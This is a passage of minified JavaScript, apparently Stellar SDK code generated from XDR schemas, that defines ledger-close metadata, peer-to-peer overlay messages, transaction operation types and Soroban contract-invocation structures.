                ledgerEntryState: 3
            }),
            b.union("LedgerEntryChange", {
                switchOn: b.lookup("LedgerEntryChangeType"),
                switchName: "type",
                switches: [["ledgerEntryCreated", "created"], ["ledgerEntryUpdated", "updated"], ["ledgerEntryRemoved", "removed"], ["ledgerEntryState", "state"]],
                arms: {
                    created: b.lookup("LedgerEntry"),
                    updated: b.lookup("LedgerEntry"),
                    removed: b.lookup("LedgerKey"),
                    state: b.lookup("LedgerEntry")
                }
            }),
            b.typedef("LedgerEntryChanges", b.varArray(b.lookup("LedgerEntryChange"), 2147483647)),
            b.struct("OperationMeta", [["changes", b.lookup("LedgerEntryChanges")]]),
            b.struct("TransactionMetaV1", [["txChanges", b.lookup("LedgerEntryChanges")], ["operations", b.varArray(b.lookup("OperationMeta"), 2147483647)]]),
            b.struct("TransactionMetaV2", [["txChangesBefore", b.lookup("LedgerEntryChanges")], ["operations", b.varArray(b.lookup("OperationMeta"), 2147483647)], ["txChangesAfter", b.lookup("LedgerEntryChanges")]]),
            b.enum("ContractEventType", {
                system: 0,
                contract: 1,
                diagnostic: 2
            }),
            b.struct("ContractEventV0", [["topics", b.varArray(b.lookup("ScVal"), 2147483647)], ["data", b.lookup("ScVal")]]),
            b.union("ContractEventBody", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, "v0"]],
                arms: {
                    v0: b.lookup("ContractEventV0")
                }
            }),
            b.struct("ContractEvent", [["ext", b.lookup("ExtensionPoint")], ["contractId", b.option(b.lookup("Hash"))], ["type", b.lookup("ContractEventType")], ["body", b.lookup("ContractEventBody")]]),
            b.struct("DiagnosticEvent", [["inSuccessfulContractCall", b.bool()], ["event", b.lookup("ContractEvent")]]),
            b.typedef("DiagnosticEvents", b.varArray(b.lookup("DiagnosticEvent"), 2147483647)),
            b.struct("SorobanTransactionMetaExtV1", [["ext", b.lookup("ExtensionPoint")], ["totalNonRefundableResourceFeeCharged", b.lookup("Int64")], ["totalRefundableResourceFeeCharged", b.lookup("Int64")], ["rentFeeCharged", b.lookup("Int64")]]),
            b.union("SorobanTransactionMetaExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "v1"]],
                arms: {
                    v1: b.lookup("SorobanTransactionMetaExtV1")
                }
            }),
            b.struct("SorobanTransactionMeta", [["ext", b.lookup("SorobanTransactionMetaExt")], ["events", b.varArray(b.lookup("ContractEvent"), 2147483647)], ["returnValue", b.lookup("ScVal")], ["diagnosticEvents", b.varArray(b.lookup("DiagnosticEvent"), 2147483647)]]),
            b.struct("TransactionMetaV3", [["ext", b.lookup("ExtensionPoint")], ["txChangesBefore", b.lookup("LedgerEntryChanges")], ["operations", b.varArray(b.lookup("OperationMeta"), 2147483647)], ["txChangesAfter", b.lookup("LedgerEntryChanges")], ["sorobanMeta", b.option(b.lookup("SorobanTransactionMeta"))]]),
            b.struct("InvokeHostFunctionSuccessPreImage", [["returnValue", b.lookup("ScVal")], ["events", b.varArray(b.lookup("ContractEvent"), 2147483647)]]),
            b.union("TransactionMeta", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, "operations"], [1, "v1"], [2, "v2"], [3, "v3"]],
                arms: {
                    operations: b.varArray(b.lookup("OperationMeta"), 2147483647),
                    v1: b.lookup("TransactionMetaV1"),
                    v2: b.lookup("TransactionMetaV2"),
                    v3: b.lookup("TransactionMetaV3")
                }
            }),
            b.struct("TransactionResultMeta", [["result", b.lookup("TransactionResultPair")], ["feeProcessing", b.lookup("LedgerEntryChanges")], ["txApplyProcessing", b.lookup("TransactionMeta")]]),
            b.struct("UpgradeEntryMeta", [["upgrade", b.lookup("LedgerUpgrade")], ["changes", b.lookup("LedgerEntryChanges")]]),
            b.struct("LedgerCloseMetaV0", [["ledgerHeader", b.lookup("LedgerHeaderHistoryEntry")], ["txSet", b.lookup("TransactionSet")], ["txProcessing", b.varArray(b.lookup("TransactionResultMeta"), 2147483647)], ["upgradesProcessing", b.varArray(b.lookup("UpgradeEntryMeta"), 2147483647)], ["scpInfo", b.varArray(b.lookup("ScpHistoryEntry"), 2147483647)]]),
            b.struct("LedgerCloseMetaExtV1", [["ext", b.lookup("ExtensionPoint")], ["sorobanFeeWrite1Kb", b.lookup("Int64")]]),
            b.union("LedgerCloseMetaExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "v1"]],
                arms: {
                    v1: b.lookup("LedgerCloseMetaExtV1")
                }
            }),
            b.struct("LedgerCloseMetaV1", [["ext", b.lookup("LedgerCloseMetaExt")], ["ledgerHeader", b.lookup("LedgerHeaderHistoryEntry")], ["txSet", b.lookup("GeneralizedTransactionSet")], ["txProcessing", b.varArray(b.lookup("TransactionResultMeta"), 2147483647)], ["upgradesProcessing", b.varArray(b.lookup("UpgradeEntryMeta"), 2147483647)], ["scpInfo", b.varArray(b.lookup("ScpHistoryEntry"), 2147483647)], ["totalByteSizeOfBucketList", b.lookup("Uint64")], ["evictedTemporaryLedgerKeys", b.varArray(b.lookup("LedgerKey"), 2147483647)], ["evictedPersistentLedgerEntries", b.varArray(b.lookup("LedgerEntry"), 2147483647)]]),
            b.union("LedgerCloseMeta", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, "v0"], [1, "v1"]],
                arms: {
                    v0: b.lookup("LedgerCloseMetaV0"),
                    v1: b.lookup("LedgerCloseMetaV1")
                }
            }),
            b.enum("ErrorCode", {
                errMisc: 0,
                errData: 1,
                errConf: 2,
                errAuth: 3,
                errLoad: 4
            }),
            b.struct("Error", [["code", b.lookup("ErrorCode")], ["msg", b.string(100)]]),
            b.struct("SendMore", [["numMessages", b.lookup("Uint32")]]),
            b.struct("SendMoreExtended", [["numMessages", b.lookup("Uint32")], ["numBytes", b.lookup("Uint32")]]),
            b.struct("AuthCert", [["pubkey", b.lookup("Curve25519Public")], ["expiration", b.lookup("Uint64")], ["sig", b.lookup("Signature")]]),
            b.struct("Hello", [["ledgerVersion", b.lookup("Uint32")], ["overlayVersion", b.lookup("Uint32")], ["overlayMinVersion", b.lookup("Uint32")], ["networkId", b.lookup("Hash")], ["versionStr", b.string(100)], ["listeningPort", b.int()], ["peerId", b.lookup("NodeId")], ["cert", b.lookup("AuthCert")], ["nonce", b.lookup("Uint256")]]),
            b.const("AUTH_MSG_FLAG_FLOW_CONTROL_BYTES_REQUESTED", 200),
            b.struct("Auth", [["flags", b.int()]]),
            b.enum("IpAddrType", {
                iPv4: 0,
                iPv6: 1
            }),
            b.union("PeerAddressIp", {
                switchOn: b.lookup("IpAddrType"),
                switchName: "type",
                switches: [["iPv4", "ipv4"], ["iPv6", "ipv6"]],
                arms: {
                    ipv4: b.opaque(4),
                    ipv6: b.opaque(16)
                }
            }),
            b.struct("PeerAddress", [["ip", b.lookup("PeerAddressIp")], ["port", b.lookup("Uint32")], ["numFailures", b.lookup("Uint32")]]),
            b.enum("MessageType", {
                errorMsg: 0,
                auth: 2,
                dontHave: 3,
                getPeers: 4,
                peers: 5,
                getTxSet: 6,
                txSet: 7,
                generalizedTxSet: 17,
                transaction: 8,
                getScpQuorumset: 9,
                scpQuorumset: 10,
                scpMessage: 11,
                getScpState: 12,
                hello: 13,
                surveyRequest: 14,
                surveyResponse: 15,
                sendMore: 16,
                sendMoreExtended: 20,
                floodAdvert: 18,
                floodDemand: 19,
                timeSlicedSurveyRequest: 21,
                timeSlicedSurveyResponse: 22,
                timeSlicedSurveyStartCollecting: 23,
                timeSlicedSurveyStopCollecting: 24
            }),
            b.struct("DontHave", [["type", b.lookup("MessageType")], ["reqHash", b.lookup("Uint256")]]),
            b.enum("SurveyMessageCommandType", {
                surveyTopology: 0,
                timeSlicedSurveyTopology: 1
            }),
            b.enum("SurveyMessageResponseType", {
                surveyTopologyResponseV0: 0,
                surveyTopologyResponseV1: 1,
                surveyTopologyResponseV2: 2
            }),
            b.struct("TimeSlicedSurveyStartCollectingMessage", [["surveyorId", b.lookup("NodeId")], ["nonce", b.lookup("Uint32")], ["ledgerNum", b.lookup("Uint32")]]),
            b.struct("SignedTimeSlicedSurveyStartCollectingMessage", [["signature", b.lookup("Signature")], ["startCollecting", b.lookup("TimeSlicedSurveyStartCollectingMessage")]]),
            b.struct("TimeSlicedSurveyStopCollectingMessage", [["surveyorId", b.lookup("NodeId")], ["nonce", b.lookup("Uint32")], ["ledgerNum", b.lookup("Uint32")]]),
            b.struct("SignedTimeSlicedSurveyStopCollectingMessage", [["signature", b.lookup("Signature")], ["stopCollecting", b.lookup("TimeSlicedSurveyStopCollectingMessage")]]),
            b.struct("SurveyRequestMessage", [["surveyorPeerId", b.lookup("NodeId")], ["surveyedPeerId", b.lookup("NodeId")], ["ledgerNum", b.lookup("Uint32")], ["encryptionKey", b.lookup("Curve25519Public")], ["commandType", b.lookup("SurveyMessageCommandType")]]),
            b.struct("TimeSlicedSurveyRequestMessage", [["request", b.lookup("SurveyRequestMessage")], ["nonce", b.lookup("Uint32")], ["inboundPeersIndex", b.lookup("Uint32")], ["outboundPeersIndex", b.lookup("Uint32")]]),
            b.struct("SignedSurveyRequestMessage", [["requestSignature", b.lookup("Signature")], ["request", b.lookup("SurveyRequestMessage")]]),
            b.struct("SignedTimeSlicedSurveyRequestMessage", [["requestSignature", b.lookup("Signature")], ["request", b.lookup("TimeSlicedSurveyRequestMessage")]]),
            b.typedef("EncryptedBody", b.varOpaque(64e3)),
            b.struct("SurveyResponseMessage", [["surveyorPeerId", b.lookup("NodeId")], ["surveyedPeerId", b.lookup("NodeId")], ["ledgerNum", b.lookup("Uint32")], ["commandType", b.lookup("SurveyMessageCommandType")], ["encryptedBody", b.lookup("EncryptedBody")]]),
            b.struct("TimeSlicedSurveyResponseMessage", [["response", b.lookup("SurveyResponseMessage")], ["nonce", b.lookup("Uint32")]]),
            b.struct("SignedSurveyResponseMessage", [["responseSignature", b.lookup("Signature")], ["response", b.lookup("SurveyResponseMessage")]]),
            b.struct("SignedTimeSlicedSurveyResponseMessage", [["responseSignature", b.lookup("Signature")], ["response", b.lookup("TimeSlicedSurveyResponseMessage")]]),
            b.struct("PeerStats", [["id", b.lookup("NodeId")], ["versionStr", b.string(100)], ["messagesRead", b.lookup("Uint64")], ["messagesWritten", b.lookup("Uint64")], ["bytesRead", b.lookup("Uint64")], ["bytesWritten", b.lookup("Uint64")], ["secondsConnected", b.lookup("Uint64")], ["uniqueFloodBytesRecv", b.lookup("Uint64")], ["duplicateFloodBytesRecv", b.lookup("Uint64")], ["uniqueFetchBytesRecv", b.lookup("Uint64")], ["duplicateFetchBytesRecv", b.lookup("Uint64")], ["uniqueFloodMessageRecv", b.lookup("Uint64")], ["duplicateFloodMessageRecv", b.lookup("Uint64")], ["uniqueFetchMessageRecv", b.lookup("Uint64")], ["duplicateFetchMessageRecv", b.lookup("Uint64")]]),
            b.typedef("PeerStatList", b.varArray(b.lookup("PeerStats"), 25)),
            b.struct("TimeSlicedNodeData", [["addedAuthenticatedPeers", b.lookup("Uint32")], ["droppedAuthenticatedPeers", b.lookup("Uint32")], ["totalInboundPeerCount", b.lookup("Uint32")], ["totalOutboundPeerCount", b.lookup("Uint32")], ["p75ScpFirstToSelfLatencyMs", b.lookup("Uint32")], ["p75ScpSelfToOtherLatencyMs", b.lookup("Uint32")], ["lostSyncCount", b.lookup("Uint32")], ["isValidator", b.bool()], ["maxInboundPeerCount", b.lookup("Uint32")], ["maxOutboundPeerCount", b.lookup("Uint32")]]),
            b.struct("TimeSlicedPeerData", [["peerStats", b.lookup("PeerStats")], ["averageLatencyMs", b.lookup("Uint32")]]),
            b.typedef("TimeSlicedPeerDataList", b.varArray(b.lookup("TimeSlicedPeerData"), 25)),
            b.struct("TopologyResponseBodyV0", [["inboundPeers", b.lookup("PeerStatList")], ["outboundPeers", b.lookup("PeerStatList")], ["totalInboundPeerCount", b.lookup("Uint32")], ["totalOutboundPeerCount", b.lookup("Uint32")]]),
            b.struct("TopologyResponseBodyV1", [["inboundPeers", b.lookup("PeerStatList")], ["outboundPeers", b.lookup("PeerStatList")], ["totalInboundPeerCount", b.lookup("Uint32")], ["totalOutboundPeerCount", b.lookup("Uint32")], ["maxInboundPeerCount", b.lookup("Uint32")], ["maxOutboundPeerCount", b.lookup("Uint32")]]),
            b.struct("TopologyResponseBodyV2", [["inboundPeers", b.lookup("TimeSlicedPeerDataList")], ["outboundPeers", b.lookup("TimeSlicedPeerDataList")], ["nodeData", b.lookup("TimeSlicedNodeData")]]),
            b.union("SurveyResponseBody", {
                switchOn: b.lookup("SurveyMessageResponseType"),
                switchName: "type",
                switches: [["surveyTopologyResponseV0", "topologyResponseBodyV0"], ["surveyTopologyResponseV1", "topologyResponseBodyV1"], ["surveyTopologyResponseV2", "topologyResponseBodyV2"]],
                arms: {
                    topologyResponseBodyV0: b.lookup("TopologyResponseBodyV0"),
                    topologyResponseBodyV1: b.lookup("TopologyResponseBodyV1"),
                    topologyResponseBodyV2: b.lookup("TopologyResponseBodyV2")
                }
            }),
            b.const("TX_ADVERT_VECTOR_MAX_SIZE", 1e3),
            b.typedef("TxAdvertVector", b.varArray(b.lookup("Hash"), b.lookup("TX_ADVERT_VECTOR_MAX_SIZE"))),
            b.struct("FloodAdvert", [["txHashes", b.lookup("TxAdvertVector")]]),
            b.const("TX_DEMAND_VECTOR_MAX_SIZE", 1e3),
            b.typedef("TxDemandVector", b.varArray(b.lookup("Hash"), b.lookup("TX_DEMAND_VECTOR_MAX_SIZE"))),
            b.struct("FloodDemand", [["txHashes", b.lookup("TxDemandVector")]]),
            b.union("StellarMessage", {
                switchOn: b.lookup("MessageType"),
                switchName: "type",
                switches: [["errorMsg", "error"], ["hello", "hello"], ["auth", "auth"], ["dontHave", "dontHave"], ["getPeers", b.void()], ["peers", "peers"], ["getTxSet", "txSetHash"], ["txSet", "txSet"], ["generalizedTxSet", "generalizedTxSet"], ["transaction", "transaction"], ["surveyRequest", "signedSurveyRequestMessage"], ["surveyResponse", "signedSurveyResponseMessage"], ["timeSlicedSurveyRequest", "signedTimeSlicedSurveyRequestMessage"], ["timeSlicedSurveyResponse", "signedTimeSlicedSurveyResponseMessage"], ["timeSlicedSurveyStartCollecting", "signedTimeSlicedSurveyStartCollectingMessage"], ["timeSlicedSurveyStopCollecting", "signedTimeSlicedSurveyStopCollectingMessage"], ["getScpQuorumset", "qSetHash"], ["scpQuorumset", "qSet"], ["scpMessage", "envelope"], ["getScpState", "getScpLedgerSeq"], ["sendMore", "sendMoreMessage"], ["sendMoreExtended", "sendMoreExtendedMessage"], ["floodAdvert", "floodAdvert"], ["floodDemand", "floodDemand"]],
                arms: {
                    error: b.lookup("Error"),
                    hello: b.lookup("Hello"),
                    auth: b.lookup("Auth"),
                    dontHave: b.lookup("DontHave"),
                    peers: b.varArray(b.lookup("PeerAddress"), 100),
                    txSetHash: b.lookup("Uint256"),
                    txSet: b.lookup("TransactionSet"),
                    generalizedTxSet: b.lookup("GeneralizedTransactionSet"),
                    transaction: b.lookup("TransactionEnvelope"),
                    signedSurveyRequestMessage: b.lookup("SignedSurveyRequestMessage"),
                    signedSurveyResponseMessage: b.lookup("SignedSurveyResponseMessage"),
                    signedTimeSlicedSurveyRequestMessage: b.lookup("SignedTimeSlicedSurveyRequestMessage"),
                    signedTimeSlicedSurveyResponseMessage: b.lookup("SignedTimeSlicedSurveyResponseMessage"),
                    signedTimeSlicedSurveyStartCollectingMessage: b.lookup("SignedTimeSlicedSurveyStartCollectingMessage"),
                    signedTimeSlicedSurveyStopCollectingMessage: b.lookup("SignedTimeSlicedSurveyStopCollectingMessage"),
                    qSetHash: b.lookup("Uint256"),
                    qSet: b.lookup("ScpQuorumSet"),
                    envelope: b.lookup("ScpEnvelope"),
                    getScpLedgerSeq: b.lookup("Uint32"),
                    sendMoreMessage: b.lookup("SendMore"),
                    sendMoreExtendedMessage: b.lookup("SendMoreExtended"),
                    floodAdvert: b.lookup("FloodAdvert"),
                    floodDemand: b.lookup("FloodDemand")
                }
            }),
            b.struct("AuthenticatedMessageV0", [["sequence", b.lookup("Uint64")], ["message", b.lookup("StellarMessage")], ["mac", b.lookup("HmacSha256Mac")]]),
            b.union("AuthenticatedMessage", {
                switchOn: b.lookup("Uint32"),
                switchName: "v",
                switches: [[0, "v0"]],
                arms: {
                    v0: b.lookup("AuthenticatedMessageV0")
                }
            }),
            b.const("MAX_OPS_PER_TX", 100),
            b.union("LiquidityPoolParameters", {
                switchOn: b.lookup("LiquidityPoolType"),
                switchName: "type",
                switches: [["liquidityPoolConstantProduct", "constantProduct"]],
                arms: {
                    constantProduct: b.lookup("LiquidityPoolConstantProductParameters")
                }
            }),
            b.struct("MuxedAccountMed25519", [["id", b.lookup("Uint64")], ["ed25519", b.lookup("Uint256")]]),
            b.union("MuxedAccount", {
                switchOn: b.lookup("CryptoKeyType"),
                switchName: "type",
                switches: [["keyTypeEd25519", "ed25519"], ["keyTypeMuxedEd25519", "med25519"]],
                arms: {
                    ed25519: b.lookup("Uint256"),
                    med25519: b.lookup("MuxedAccountMed25519")
                }
            }),
            b.struct("DecoratedSignature", [["hint", b.lookup("SignatureHint")], ["signature", b.lookup("Signature")]]),
            b.enum("OperationType", {
                createAccount: 0,
                payment: 1,
                pathPaymentStrictReceive: 2,
                manageSellOffer: 3,
                createPassiveSellOffer: 4,
                setOptions: 5,
                changeTrust: 6,
                allowTrust: 7,
                accountMerge: 8,
                inflation: 9,
                manageData: 10,
                bumpSequence: 11,
                manageBuyOffer: 12,
                pathPaymentStrictSend: 13,
                createClaimableBalance: 14,
                claimClaimableBalance: 15,
                beginSponsoringFutureReserves: 16,
                endSponsoringFutureReserves: 17,
                revokeSponsorship: 18,
                clawback: 19,
                clawbackClaimableBalance: 20,
                setTrustLineFlags: 21,
                liquidityPoolDeposit: 22,
                liquidityPoolWithdraw: 23,
                invokeHostFunction: 24,
                extendFootprintTtl: 25,
                restoreFootprint: 26
            }),
            b.struct("CreateAccountOp", [["destination", b.lookup("AccountId")], ["startingBalance", b.lookup("Int64")]]),
            b.struct("PaymentOp", [["destination", b.lookup("MuxedAccount")], ["asset", b.lookup("Asset")], ["amount", b.lookup("Int64")]]),
            b.struct("PathPaymentStrictReceiveOp", [["sendAsset", b.lookup("Asset")], ["sendMax", b.lookup("Int64")], ["destination", b.lookup("MuxedAccount")], ["destAsset", b.lookup("Asset")], ["destAmount", b.lookup("Int64")], ["path", b.varArray(b.lookup("Asset"), 5)]]),
            b.struct("PathPaymentStrictSendOp", [["sendAsset", b.lookup("Asset")], ["sendAmount", b.lookup("Int64")], ["destination", b.lookup("MuxedAccount")], ["destAsset", b.lookup("Asset")], ["destMin", b.lookup("Int64")], ["path", b.varArray(b.lookup("Asset"), 5)]]),
            b.struct("ManageSellOfferOp", [["selling", b.lookup("Asset")], ["buying", b.lookup("Asset")], ["amount", b.lookup("Int64")], ["price", b.lookup("Price")], ["offerId", b.lookup("Int64")]]),
            b.struct("ManageBuyOfferOp", [["selling", b.lookup("Asset")], ["buying", b.lookup("Asset")], ["buyAmount", b.lookup("Int64")], ["price", b.lookup("Price")], ["offerId", b.lookup("Int64")]]),
            b.struct("CreatePassiveSellOfferOp", [["selling", b.lookup("Asset")], ["buying", b.lookup("Asset")], ["amount", b.lookup("Int64")], ["price", b.lookup("Price")]]),
            b.struct("SetOptionsOp", [["inflationDest", b.option(b.lookup("AccountId"))], ["clearFlags", b.option(b.lookup("Uint32"))], ["setFlags", b.option(b.lookup("Uint32"))], ["masterWeight", b.option(b.lookup("Uint32"))], ["lowThreshold", b.option(b.lookup("Uint32"))], ["medThreshold", b.option(b.lookup("Uint32"))], ["highThreshold", b.option(b.lookup("Uint32"))], ["homeDomain", b.option(b.lookup("String32"))], ["signer", b.option(b.lookup("Signer"))]]),
            b.union("ChangeTrustAsset", {
                switchOn: b.lookup("AssetType"),
                switchName: "type",
                switches: [["assetTypeNative", b.void()], ["assetTypeCreditAlphanum4", "alphaNum4"], ["assetTypeCreditAlphanum12", "alphaNum12"], ["assetTypePoolShare", "liquidityPool"]],
                arms: {
                    alphaNum4: b.lookup("AlphaNum4"),
                    alphaNum12: b.lookup("AlphaNum12"),
                    liquidityPool: b.lookup("LiquidityPoolParameters")
                }
            }),
            b.struct("ChangeTrustOp", [["line", b.lookup("ChangeTrustAsset")], ["limit", b.lookup("Int64")]]),
            b.struct("AllowTrustOp", [["trustor", b.lookup("AccountId")], ["asset", b.lookup("AssetCode")], ["authorize", b.lookup("Uint32")]]),
            b.struct("ManageDataOp", [["dataName", b.lookup("String64")], ["dataValue", b.option(b.lookup("DataValue"))]]),
            b.struct("BumpSequenceOp", [["bumpTo", b.lookup("SequenceNumber")]]),
            b.struct("CreateClaimableBalanceOp", [["asset", b.lookup("Asset")], ["amount", b.lookup("Int64")], ["claimants", b.varArray(b.lookup("Claimant"), 10)]]),
            b.struct("ClaimClaimableBalanceOp", [["balanceId", b.lookup("ClaimableBalanceId")]]),
            b.struct("BeginSponsoringFutureReservesOp", [["sponsoredId", b.lookup("AccountId")]]),
            b.enum("RevokeSponsorshipType", {
                revokeSponsorshipLedgerEntry: 0,
                revokeSponsorshipSigner: 1
            }),
            b.struct("RevokeSponsorshipOpSigner", [["accountId", b.lookup("AccountId")], ["signerKey", b.lookup("SignerKey")]]),
            b.union("RevokeSponsorshipOp", {
                switchOn: b.lookup("RevokeSponsorshipType"),
                switchName: "type",
                switches: [["revokeSponsorshipLedgerEntry", "ledgerKey"], ["revokeSponsorshipSigner", "signer"]],
                arms: {
                    ledgerKey: b.lookup("LedgerKey"),
                    signer: b.lookup("RevokeSponsorshipOpSigner")
                }
            }),
            b.struct("ClawbackOp", [["asset", b.lookup("Asset")], ["from", b.lookup("MuxedAccount")], ["amount", b.lookup("Int64")]]),
            b.struct("ClawbackClaimableBalanceOp", [["balanceId", b.lookup("ClaimableBalanceId")]]),
            b.struct("SetTrustLineFlagsOp", [["trustor", b.lookup("AccountId")], ["asset", b.lookup("Asset")], ["clearFlags", b.lookup("Uint32")], ["setFlags", b.lookup("Uint32")]]),
            b.const("LIQUIDITY_POOL_FEE_V18", 30),
            b.struct("LiquidityPoolDepositOp", [["liquidityPoolId", b.lookup("PoolId")], ["maxAmountA", b.lookup("Int64")], ["maxAmountB", b.lookup("Int64")], ["minPrice", b.lookup("Price")], ["maxPrice", b.lookup("Price")]]),
            b.struct("LiquidityPoolWithdrawOp", [["liquidityPoolId", b.lookup("PoolId")], ["amount", b.lookup("Int64")], ["minAmountA", b.lookup("Int64")], ["minAmountB", b.lookup("Int64")]]),
            b.enum("HostFunctionType", {
                hostFunctionTypeInvokeContract: 0,
                hostFunctionTypeCreateContract: 1,
                hostFunctionTypeUploadContractWasm: 2,
                hostFunctionTypeCreateContractV2: 3
            }),
            b.enum("ContractIdPreimageType", {
                contractIdPreimageFromAddress: 0,
                contractIdPreimageFromAsset: 1
            }),
            b.struct("ContractIdPreimageFromAddress", [["address", b.lookup("ScAddress")], ["salt", b.lookup("Uint256")]]),
            b.union("ContractIdPreimage", {
                switchOn: b.lookup("ContractIdPreimageType"),
                switchName: "type",
                switches: [["contractIdPreimageFromAddress", "fromAddress"], ["contractIdPreimageFromAsset", "fromAsset"]],
                arms: {
                    fromAddress: b.lookup("ContractIdPreimageFromAddress"),
                    fromAsset: b.lookup("Asset")
                }
            }),
            b.struct("CreateContractArgs", [["contractIdPreimage", b.lookup("ContractIdPreimage")], ["executable", b.lookup("ContractExecutable")]]),
            b.struct("CreateContractArgsV2", [["contractIdPreimage", b.lookup("ContractIdPreimage")], ["executable", b.lookup("ContractExecutable")], ["constructorArgs", b.varArray(b.lookup("ScVal"), 2147483647)]]),
            b.struct("InvokeContractArgs", [["contractAddress", b.lookup("ScAddress")], ["functionName", b.lookup("ScSymbol")], ["args", b.varArray(b.lookup("ScVal"), 2147483647)]]),
            b.union("HostFunction", {
                switchOn: b.lookup("HostFunctionType"),
                switchName: "type",
                switches: [["hostFunctionTypeInvokeContract", "invokeContract"], ["hostFunctionTypeCreateContract", "createContract"], ["hostFunctionTypeUploadContractWasm", "wasm"], ["hostFunctionTypeCreateContractV2", "createContractV2"]],
                arms: {
                    invokeContract: b.lookup("InvokeContractArgs"),
                    createContract: b.lookup("CreateContractArgs"),
                    wasm: b.varOpaque(),
                    createContractV2: b.lookup("CreateContractArgsV2")
                }
            }),
            b.enum("SorobanAuthorizedFunctionType", {
                sorobanAuthorizedFunctionTypeContractFn: 0,
                sorobanAuthorizedFunctionTypeCreateContractHostFn: 1,
                sorobanAuthorizedFunctionTypeCreateContractV2HostFn: 2
            }),
            b.union("SorobanAuthorizedFunction", {
                switchOn: b.lookup("SorobanAuthorizedFunctionType"),
                switchName: "type",
                switches: [["sorobanAuthorizedFunctionTypeContractFn", "contractFn"], ["sorobanAuthorizedFunctionTypeCreateContractHostFn", "createContractHostFn"], ["sorobanAuthorizedFunctionTypeCreateContractV2HostFn", "createContractV2HostFn"]],
                arms: {
                    contractFn: b.lookup("InvokeContractArgs"),
                    createContractHostFn: b.lookup("CreateContractArgs"),
                    createContractV2HostFn: b.lookup("CreateContractArgsV2")
                }
            }),
            b.struct("SorobanAuthorizedInvocation", [["function", b.lookup("SorobanAuthorizedFunction")], ["subInvocations", b.varArray(b.lookup("SorobanAuthorizedInvocation"), 2147483647)]]),
            b.struct("SorobanAddressCredentials", [["address", b.lookup("ScAddress")], ["nonce", b.lookup("Int64")], ["signatureExpirationLedger", b.lookup("Uint32")], ["signature", b.lookup("ScVal")]]),
            b.enum("SorobanCredentialsType", {
                sorobanCredentialsSourceAccount: 0,
                sorobanCredentialsAddress: 1
            }),
            b.union("SorobanCredentials", {
                switchOn: b.lookup("SorobanCredentialsType"),
                switchName: "type",
                switches: [["sorobanCredentialsSourceAccount", b.void()], ["sorobanCredentialsAddress", "address"]],
                arms: {
                    address: b.lookup("SorobanAddressCredentials")
                }
            }),
            b.struct("SorobanAuthorizationEntry", [["credentials", b.lookup("SorobanCredentials")], ["rootInvocation", b.lookup("SorobanAuthorizedInvocation")]]),
            b.struct("InvokeHostFunctionOp", [["hostFunction", b.lookup("HostFunction")], ["auth", b.varArray(b.lookup("SorobanAuthorizationEntry"), 2147483647)]]),
            b.struct("ExtendFootprintTtlOp", [["ext", b.lookup("ExtensionPoint")], ["extendTo", b.lookup("Uint32")]]),
            b.struct("RestoreFootprintOp", [["ext", b.lookup("ExtensionPoint")]]),
            b.union("OperationBody", {
                switchOn: b.lookup("OperationType"),
                switchName: "type",
                switches: [["createAccount", "createAccountOp"], ["payment", "paymentOp"], ["pathPaymentStrictReceive", "pathPaymentStrictReceiveOp"], ["manageSellOffer", "manageSellOfferOp"], ["createPassiveSellOffer", "createPassiveSellOfferOp"], ["setOptions", "setOptionsOp"], ["changeTrust", "changeTrustOp"], ["allowTrust", "allowTrustOp"], ["accountMerge", "destination"], ["inflation", b.void()], ["manageData", "manageDataOp"], ["bumpSequence", "bumpSequenceOp"], ["manageBuyOffer", "manageBuyOfferOp"], ["pathPaymentStrictSend", "pathPaymentStrictSendOp"], ["createClaimableBalance", "createClaimableBalanceOp"], ["claimClaimableBalance", "claimClaimableBalanceOp"], ["beginSponsoringFutureReserves", "beginSponsoringFutureReservesOp"], ["endSponsoringFutureReserves", b.void()], ["revokeSponsorship", "revokeSponsorshipOp"], ["clawback", "clawbackOp"], ["clawbackClaimableBalance", "clawbackClaimableBalanceOp"], ["setTrustLineFlags", "setTrustLineFlagsOp"], ["liquidityPoolDeposit", "liquidityPoolDepositOp"], ["liquidityPoolWithdraw", "liquidityPoolWithdrawOp"], ["invokeHostFunction", "invokeHostFunctionOp"], ["extendFootprintTtl", "extendFootprintTtlOp"], ["restoreFootprint", "restoreFootprintOp"]],
                arms: {
                    createAccountOp: b.lookup("CreateAccountOp"),
                    paymentOp: b.lookup("PaymentOp"),
                    pathPaymentStrictReceiveOp: b.lookup("PathPaymentStrictReceiveOp"),
                    manageSellOfferOp: b.lookup("ManageSellOfferOp"),
                    createPassiveSellOfferOp: b.lookup("CreatePassiveSellOfferOp"),
                    setOptionsOp: b.lookup("SetOptionsOp"),
                    changeTrustOp: b.lookup("ChangeTrustOp"),
                    allowTrustOp: b.lookup("AllowTrustOp"),
                    destination: b.lookup("MuxedAccount"),
                    manageDataOp: b.lookup("ManageDataOp"),
                    bumpSequenceOp: b.lookup("BumpSequenceOp"),
                    manageBuyOfferOp: b.lookup("ManageBuyOfferOp"),
                    pathPaymentStrictSendOp: b.lookup("PathPaymentStrictSendOp"),
                    createClaimableBalanceOp: b.lookup("CreateClaimableBalanceOp"),
                    claimClaimableBalanceOp: b.lookup("ClaimClaimableBalanceOp"),
                    beginSponsoringFutureReservesOp: b.lookup("BeginSponsoringFutureReservesOp"),
                    revokeSponsorshipOp: b.lookup("RevokeSponsorshipOp"),
                    clawbackOp: b.lookup("ClawbackOp"),
                    clawbackClaimableBalanceOp: b.lookup("ClawbackClaimableBalanceOp"),
                    setTrustLineFlagsOp: b.lookup("SetTrustLineFlagsOp"),
                    liquidityPoolDepositOp: b.lookup("LiquidityPoolDepositOp"),
                    liquidityPoolWithdrawOp: b.lookup("LiquidityPoolWithdrawOp"),
                    invokeHostFunctionOp: b.lookup("InvokeHostFunctionOp"),
                    extendFootprintTtlOp: b.lookup("ExtendFootprintTtlOp"),
                    restoreFootprintOp: b.lookup("RestoreFootprintOp")
                }
            }),
            b.struct("Operation", [["sourceAccount", b.option(b.lookup("MuxedAccount"))], ["body", b.lookup("OperationBody")]]),
            b.struct("HashIdPreimageOperationId", [["sourceAccount", b.lookup("AccountId")], ["seqNum", b.lookup("SequenceNumber")], ["opNum", b.lookup("Uint32")]]),
